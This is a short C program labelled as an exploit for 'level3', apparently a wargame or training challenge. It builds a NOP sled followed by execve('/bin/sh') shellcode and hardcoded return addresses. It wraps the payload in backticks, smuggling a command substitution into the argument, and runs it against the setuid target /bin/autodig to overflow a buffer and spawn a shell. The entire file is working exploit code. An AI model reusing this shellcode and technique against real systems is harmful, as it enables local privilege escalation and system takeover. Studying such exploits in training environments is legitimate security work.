/*
 * Author : superdk@hanmail.net
 * DATA : exploit for level3
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define VICTIM	"/bin/autodig"

#define NOP 0x90
#define BUFSIZE 123   /* NOP(70) + shellcode(45) + sfp(4) + ret(4)*/
#define offset 0x0

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"
//  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
//  "\xe3\xb0\x0b\xcd\x80"
  "\xc8\xf9\xff\xbf\xc8\xf9\xff\xbf";

unsigned long get_sp(void)
{
	__asm__("movl %esp, %eax");
}

int main()
{
    char cmdBuf[BUFSIZE];
    char cmd[BUFSIZE];
    int i, j, shellLen;
    long addr;
    
    shellLen = strlen(shellcode);

    addr = get_sp() - offset;
    printf("Using address: 0x%x\n", addr);

    for(i=0; i<sizeof(cmdBuf)-shellLen; i++)
        cmdBuf[i] = NOP;
    printf("I : %d\n", i);
    for(j=0; j<shellLen; j++)
        cmdBuf[i++] = shellcode[j];
    printf("I : %d \n", i);

    strcpy(cmd, "`");
    strcat(cmd, cmdBuf);
    strcat(cmd, "`");

    execl(VICTIM, VICTIM, cmd, 0);
    

}



 